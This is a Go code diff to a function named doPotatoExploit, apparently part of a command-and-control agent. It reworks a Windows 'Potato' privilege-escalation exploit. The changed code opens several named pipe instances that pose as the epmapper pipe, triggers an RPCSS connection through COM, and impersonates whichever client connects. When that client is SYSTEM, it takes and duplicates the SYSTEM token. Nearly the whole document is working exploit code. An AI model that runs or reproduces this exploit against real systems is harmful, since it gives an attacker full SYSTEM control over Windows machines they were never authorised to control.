@@ -423,7 +423,10 @@ func doPotatoExploit(oldIdentity string, phase *int32) structs.CommandResult {
 		}
 	}
 
-	// Phase 4: Create named pipe server
+	// Phase 4: Create named pipe server with multiple instances.
+	// Multiple instances are needed because both our own COM runtime AND RPCSS
+	// may connect simultaneously. With a single instance, accepting our own
+	// connection first means RPCSS's connection is rejected.
 	atomic.StoreInt32(phase, 4)
 	pipeUniqueName := fmt.Sprintf("fawkes_%d", time.Now().UnixNano()%100000)
 	pipeName := fmt.Sprintf(`\\.\pipe\%s\pipe\epmapper`, pipeUniqueName)
@@ -457,34 +460,54 @@ func doPotatoExploit(oldIdentity string, phase *int32) structs.CommandResult {
 		InheritHandle:      0,
 	}
 
-	pipeNamePtr, _ := windows.UTF16PtrFromString(pipeName)
-	hPipe, _, pipeErr := procCreateNamedPipeW.Call(
-		uintptr(unsafe.Pointer(pipeNamePtr)),
-		PIPE_ACCESS_DUPLEX|FILE_FLAG_OVERLAPPED,
-		0, // PIPE_TYPE_BYTE | PIPE_READMODE_BYTE | PIPE_WAIT = 0x00
-		PIPE_UNLIMITED_INSTANCES,
-		PIPE_BUFFER_SIZE,
-		PIPE_BUFFER_SIZE,
-		0,
-		uintptr(unsafe.Pointer(&sa)),
-	)
-	if hPipe == uintptr(windows.InvalidHandle) {
-		return structs.CommandResult{
-			Output:    fmt.Sprintf("CreateNamedPipe(%s): %v", pipeName, pipeErr),
-			Status:    "error",
-			Completed: true,
-		}
+	// Create multiple pipe instances and start overlapped ConnectNamedPipe on each.
+	// This ensures both our COM runtime and RPCSS can connect simultaneously.
+	const numPipeInstances = 4
+	type pipeInstance struct {
+		handle     windows.Handle
+		event      windows.Handle
+		overlapped windows.Overlapped
 	}
-	pipeHandle := windows.Handle(hPipe)
-	defer windows.CloseHandle(pipeHandle)
+	pipes := make([]pipeInstance, numPipeInstances)
+	pipeNamePtr, _ := windows.UTF16PtrFromString(pipeName)
 
-	// Start overlapped ConnectNamedPipe (safe to cancel via CancelIo or handle close)
-	pipeEvent, _ := windows.CreateEvent(nil, 1, 0, nil)
-	defer windows.CloseHandle(pipeEvent)
-
-	var overlapped windows.Overlapped
-	overlapped.HEvent = pipeEvent
-	procConnectNamedPipe.Call(hPipe, uintptr(unsafe.Pointer(&overlapped)))
+	for i := 0; i < numPipeInstances; i++ {
+		hPipe, _, pipeErr := procCreateNamedPipeW.Call(
+			uintptr(unsafe.Pointer(pipeNamePtr)),
+			PIPE_ACCESS_DUPLEX|FILE_FLAG_OVERLAPPED,
+			0, // PIPE_TYPE_BYTE | PIPE_READMODE_BYTE | PIPE_WAIT = 0x00
+			PIPE_UNLIMITED_INSTANCES,
+			PIPE_BUFFER_SIZE,
+			PIPE_BUFFER_SIZE,
+			0,
+			uintptr(unsafe.Pointer(&sa)),
+		)
+		if hPipe == uintptr(windows.InvalidHandle) {
+			// Clean up already-created pipes
+			for j := 0; j < i; j++ {
+				windows.CloseHandle(pipes[j].event)
+				windows.CloseHandle(pipes[j].handle)
+			}
+			return structs.CommandResult{
+				Output:    fmt.Sprintf("CreateNamedPipe[%d](%s): %v", i, pipeName, pipeErr),
+				Status:    "error",
+				Completed: true,
+			}
+		}
+		evt, _ := windows.CreateEvent(nil, 1, 0, nil)
+		pipes[i] = pipeInstance{
+			handle: windows.Handle(hPipe),
+			event:  evt,
+		}
+		pipes[i].overlapped.HEvent = evt
+		procConnectNamedPipe.Call(hPipe, uintptr(unsafe.Pointer(&pipes[i].overlapped)))
+	}
+	defer func() {
+		for i := 0; i < numPipeInstances; i++ {
+			windows.CloseHandle(pipes[i].event)
+			windows.CloseHandle(pipes[i].handle)
+		}
+	}()
 
 	// Phase 5: Build native shellcode hook and install it.
 	// We use raw x64 shellcode instead of syscall.NewCallback because Go's callback
@@ -556,101 +579,107 @@ func doPotatoExploit(oldIdentity string, phase *int32) structs.CommandResult {
 		triggerErr = fmt.Errorf("CoUnmarshalInterface blocked for >5s")
 	}
 
-	// Phase 7-8: Accept pipe connections and look for SYSTEM.
-	// Our own process's COM runtime may connect first (NETWORK SERVICE),
-	// so we loop: accept → check identity → if not SYSTEM, disconnect and retry.
-	// Uses overlapped I/O for safe cancellation (closing handle while synchronous
-	// ConnectNamedPipe blocks can crash on Windows 11 24H2).
+	// Phase 7-8: Check all pipe instances for SYSTEM connection.
+	// Both our COM runtime and RPCSS may have connected simultaneously to
+	// different pipe instances. Check each instance with a connection.
 	atomic.StoreInt32(phase, 7)
 
 	systemSID, _ := windows.StringToSid("S-1-5-18") // NT AUTHORITY\SYSTEM
 	var dupToken windows.Token
 	var clientIdentity string
 	gotSystem := false
-	attempts := 0
-	const maxAttempts = 5
+	var clientIdentities []string
 
-	for attempts < maxAttempts && !gotSystem {
-		attempts++
+	// Build event array for WaitForMultipleObjects
+	events := make([]windows.Handle, numPipeInstances)
+	for i := 0; i < numPipeInstances; i++ {
+		events[i] = pipes[i].event
+	}
 
-		if attempts > 1 {
-			// Reset event and start new overlapped ConnectNamedPipe
-			windows.ResetEvent(pipeEvent)
-			procConnectNamedPipe.Call(hPipe, uintptr(unsafe.Pointer(&overlapped)))
-		}
+	// Wait for at least one connection, then check all that connected
+	deadline := time.Now().Add(15 * time.Second)
+	for !gotSystem && time.Now().Before(deadline) {
+		// Wait for any pipe event (1 second timeout per poll)
+		waitResult, _ := windows.WaitForSingleObject(events[0], 1000)
+		_ = waitResult // just polling
 
-		// Wait for connection with timeout
-		waitResult, _ := windows.WaitForSingleObject(pipeEvent, 10000)
-		if waitResult != windows.WAIT_OBJECT_0 {
-			break // timeout, no more connections
-		}
+		// Check all pipe instances for connections
+		for i := 0; i < numPipeInstances; i++ {
+			wr, _ := windows.WaitForSingleObject(pipes[i].event, 0)
+			if wr != windows.WAIT_OBJECT_0 {
+				continue // not connected yet
+			}
 
-		// Impersonate and check identity
-		atomic.StoreInt32(phase, 8)
-		ret, _, impErr := procImpersonateNamedPipeClient.Call(hPipe)
-		if ret == 0 {
+			atomic.StoreInt32(phase, 8)
+			hPipe := uintptr(pipes[i].handle)
+
+			ret, _, _ := procImpersonateNamedPipeClient.Call(hPipe)
+			if ret == 0 {
+				procDisconnectNamedPipe.Call(hPipe)
+				windows.ResetEvent(pipes[i].event)
+				procConnectNamedPipe.Call(hPipe, uintptr(unsafe.Pointer(&pipes[i].overlapped)))
+				continue
+			}
+
+			// Check if the client is SYSTEM
+			var threadToken windows.Token
+			err = windows.OpenThreadToken(windows.CurrentThread(), windows.TOKEN_ALL_ACCESS, true, &threadToken)
+			if err != nil {
+				err = windows.OpenThreadToken(windows.CurrentThread(), STEAL_TOKEN_ACCESS|TOKEN_QUERY, true, &threadToken)
+			}
+			if err != nil {
+				procRevertToSelf.Call()
+				procDisconnectNamedPipe.Call(hPipe)
+				windows.ResetEvent(pipes[i].event)
+				procConnectNamedPipe.Call(hPipe, uintptr(unsafe.Pointer(&pipes[i].overlapped)))
+				continue
+			}
+
+			tokenUser, tuErr := threadToken.GetTokenUser()
+			if tuErr != nil {
+				threadToken.Close()
+				procRevertToSelf.Call()
+				procDisconnectNamedPipe.Call(hPipe)
+				windows.ResetEvent(pipes[i].event)
+				procConnectNamedPipe.Call(hPipe, uintptr(unsafe.Pointer(&pipes[i].overlapped)))
+				continue
+			}
+
+			isSystem := tokenUser.User.Sid.Equals(systemSID)
+			clientIdentity, _ = GetCurrentIdentity()
+			clientIdentities = append(clientIdentities, clientIdentity)
+
+			if !isSystem {
+				threadToken.Close()
+				procRevertToSelf.Call()
+				procDisconnectNamedPipe.Call(hPipe)
+				windows.ResetEvent(pipes[i].event)
+				procConnectNamedPipe.Call(hPipe, uintptr(unsafe.Pointer(&pipes[i].overlapped)))
+				continue
+			}
+
+			// Got SYSTEM! Duplicate to primary token
+			err = windows.DuplicateTokenEx(threadToken, windows.MAXIMUM_ALLOWED, nil,
+				windows.SecurityDelegation, windows.TokenPrimary, &dupToken)
+			if err != nil {
+				err = windows.DuplicateTokenEx(threadToken, windows.MAXIMUM_ALLOWED, nil,
+					windows.SecurityImpersonation, windows.TokenImpersonation, &dupToken)
+			}
+			threadToken.Close()
+			procRevertToSelf.Call()
 			procDisconnectNamedPipe.Call(hPipe)
-			if attempts >= maxAttempts {
+
+			if err != nil {
 				return structs.CommandResult{
-					Output:    fmt.Sprintf("ImpersonateNamedPipeClient failed on attempt %d: %v", attempts, impErr),
+					Output:    fmt.Sprintf("Connected as %s but DuplicateTokenEx: %v", clientIdentity, err),
 					Status:    "error",
 					Completed: true,
 				}
 			}
-			continue
-		}
 
-		// Check if the client is SYSTEM
-		var threadToken windows.Token
-		err = windows.OpenThreadToken(windows.CurrentThread(), windows.TOKEN_ALL_ACCESS, true, &threadToken)
-		if err != nil {
-			err = windows.OpenThreadToken(windows.CurrentThread(), STEAL_TOKEN_ACCESS|TOKEN_QUERY, true, &threadToken)
+			gotSystem = true
+			break
 		}
-		if err != nil {
-			procRevertToSelf.Call()
-			procDisconnectNamedPipe.Call(hPipe)
-			continue
-		}
-
-		tokenUser, tuErr := threadToken.GetTokenUser()
-		if tuErr != nil {
-			threadToken.Close()
-			procRevertToSelf.Call()
-			procDisconnectNamedPipe.Call(hPipe)
-			continue
-		}
-
-		isSystem := tokenUser.User.Sid.Equals(systemSID)
-		clientIdentity, _ = GetCurrentIdentity()
-
-		if !isSystem {
-			// Not SYSTEM — disconnect and try next connection
-			threadToken.Close()
-			procRevertToSelf.Call()
-			procDisconnectNamedPipe.Call(hPipe)
-			continue
-		}
-
-		// Got SYSTEM! Duplicate to primary token
-		err = windows.DuplicateTokenEx(threadToken, windows.MAXIMUM_ALLOWED, nil,
-			windows.SecurityDelegation, windows.TokenPrimary, &dupToken)
-		if err != nil {
-			err = windows.DuplicateTokenEx(threadToken, windows.MAXIMUM_ALLOWED, nil,
-				windows.SecurityImpersonation, windows.TokenImpersonation, &dupToken)
-		}
-		threadToken.Close()
-		procRevertToSelf.Call()
-		procDisconnectNamedPipe.Call(hPipe)
-
-		if err != nil {
-			return structs.CommandResult{
-				Output:    fmt.Sprintf("Connected as %s but DuplicateTokenEx: %v", clientIdentity, err),
-				Status:    "error",
-				Completed: true,
-			}
-		}
-
-		gotSystem = true
 	}
 
 	if !gotSystem {
@@ -659,9 +688,9 @@ func doPotatoExploit(oldIdentity string, phase *int32) structs.CommandResult {
 			hookStatus = "CALLED"
 		}
 		bindingStr := "ncacn_np:localhost/pipe/" + pipeUniqueName + `[\pipe\epmapper]`
-		errMsg := fmt.Sprintf("Did not receive SYSTEM connection after %d attempts.\nPipe: %s\nBinding: %s\nHook: %s (paramCount=%d)\nDSA size: %d bytes\nOXID: %x\nOID: %x\nIPID: %x\nLast client: %s",
-			attempts, pipeName, bindingStr, hookStatus, paramCount, len(potatoGlobal.precomputedDSA),
-			oxid, oid, ipid, clientIdentity)
+		errMsg := fmt.Sprintf("Did not receive SYSTEM connection (15s timeout).\nPipe: %s\nBinding: %s\nHook: %s (paramCount=%d)\nDSA size: %d bytes\nOXID: %x\nOID: %x\nIPID: %x\nClients seen: %v",
+			pipeName, bindingStr, hookStatus, paramCount, len(potatoGlobal.precomputedDSA),
+			oxid, oid, ipid, clientIdentities)
 		if triggerErr != nil {
 			errMsg += fmt.Sprintf("\nTrigger: %v", triggerErr)
 		} else {
